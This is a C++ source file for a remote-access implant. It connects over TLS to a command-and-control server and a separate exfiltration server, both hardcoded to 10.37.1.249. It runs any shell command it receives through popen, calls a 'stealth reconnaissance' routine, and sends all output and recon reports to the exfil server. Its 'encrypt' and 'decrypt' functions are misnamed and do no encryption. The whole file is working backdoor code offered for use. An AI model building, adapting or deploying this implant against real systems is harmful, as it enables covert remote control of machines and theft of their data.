// 

#include <cstdlib>
#include <cstddef>
#include <cstdio>
#include <iostream>
#include <sstream>
#include <string>
#include <vector>
#include <memory>
#include <array>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <openssl/ssl.h>
#include <openssl/err.h>

// Full stealth reconnaissance module
#include "recon.h"

#ifndef C2_IP
#define C2_IP "10.37.1.249"
#endif
#ifndef C2_PORT
#define C2_PORT 8888
#endif
#ifndef EXFIL_IP
#define EXFIL_IP "10.37.1.249"
#endif
#ifndef EXFIL_PORT
#define EXFIL_PORT 8889
#endif

std::string decrypt(char* buf, size_t bytes) {
    buf[bytes] = '\0';
    std::string message(buf);
    return message;
}

std::vector<std::byte> encrypt(std::string s) {
    std::vector<std::byte> e;
    for(auto& c : s) {
        e.push_back(static_cast<std::byte>(c));
    }
    return e;
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string r;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    if(!pipe) { return "ERR, pipe failed"; }
    while(fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        r += buffer.data();
    }
    return r;
}

/**
 * handleMessage - processes one command from C2, sends output to exfil server
 * and a short acknowledgment to the C2 server.
 */
void handleMessage(const std::string& msg, SSL* c2_ssl, SSL* exfil_ssl) {
    std::istringstream iss(msg);
    std::string keyword, id, data;
    if (!(iss >> keyword) || !(iss >> id)) return;
    std::getline(iss, data);
    if (!data.empty() && data[0] == ' ') data.erase(0, 1);

    std::string c2_response;
    std::string exfil_data;

    if (keyword == "HELO") {
        c2_response = "HELLO " + id;
        exfil_data = "HELO from implant\n";
    } else if (keyword == "EXIT") {
        throw 1;
    } else if (keyword == "CMD") {
        std::string output = exec(data.c_str());
        c2_response = (output.empty() ? "CMD OK" : output);
        exfil_data = "CMD: " + data + "\n" + output + "\n---\n";
    } else if (keyword == "RECON") {
        // Full stealth reconnaissance
        std::string recon_report = perform_full_recon();
        c2_response = "OK " + id;   // short ack to C2
        exfil_data = "=== FULL RECON REPORT ===\n" + recon_report + "\n=== END ===\n";
    } else {
        c2_response = "ERR " + id;
    }

    // Exfiltrate detailed data to the exfil server
    if (exfil_ssl && !exfil_data.empty()) {
        SSL_write(exfil_ssl, exfil_data.c_str(), exfil_data.size());
    }

    // Send acknowledgment / short response to the C2 server
    SSL_write(c2_ssl, c2_response.c_str(), c2_response.size());
}

SSL_CTX* createSSLContext() {
    SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) {
        ERR_print_errors_fp(stderr);
        return nullptr;
    }

    // Load the CA cert to verify the server
    if (SSL_CTX_load_verify_locations(ctx, "/tmp/index.html", nullptr) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(ctx);
        return nullptr;
    }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, nullptr);
    return ctx;
}

SSL* connectTLS(SSL_CTX* ctx, int sock, const char* hostname) {
    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, sock);
    SSL_set_tlsext_host_name(ssl, hostname);

    if (SSL_connect(ssl) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_free(ssl);
        return nullptr;
    }
    return ssl;
}

int makeSocket(const char* ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    return sock;
}

int main() {
    SSL_CTX* ctx = createSSLContext();
    if (!ctx) return 1;

    // 1. Connect to C2 server (receives commands)
    int sock1 = makeSocket(C2_IP, C2_PORT);
    if (sock1 < 0) { SSL_CTX_free(ctx); return 1; }
    SSL* ssl1 = connectTLS(ctx, sock1, C2_IP);
    if (!ssl1) { close(sock1); SSL_CTX_free(ctx); return 1; }

    // 2. Connect to exfil server (sends all output)
    int sock2 = makeSocket(EXFIL_IP, EXFIL_PORT);
    if (sock2 < 0) { SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }
    SSL* ssl2 = connectTLS(ctx, sock2, EXFIL_IP);
    if (!ssl2) { close(sock2); SSL_free(ssl1); close(sock1); SSL_CTX_free(ctx); return 1; }

    char buf[1024];
    while (true) {
        int bytes = SSL_read(ssl1, buf, sizeof(buf) - 1);
        if (bytes <= 0) break;

        try {
            handleMessage(decrypt(buf, bytes), ssl1, ssl2);
        } catch (...) {
            break;
        }
    }

    SSL_shutdown(ssl1); SSL_free(ssl1); close(sock1);
    SSL_shutdown(ssl2); SSL_free(ssl2); close(sock2);
    SSL_CTX_free(ctx);

    return EXIT_SUCCESS;
}
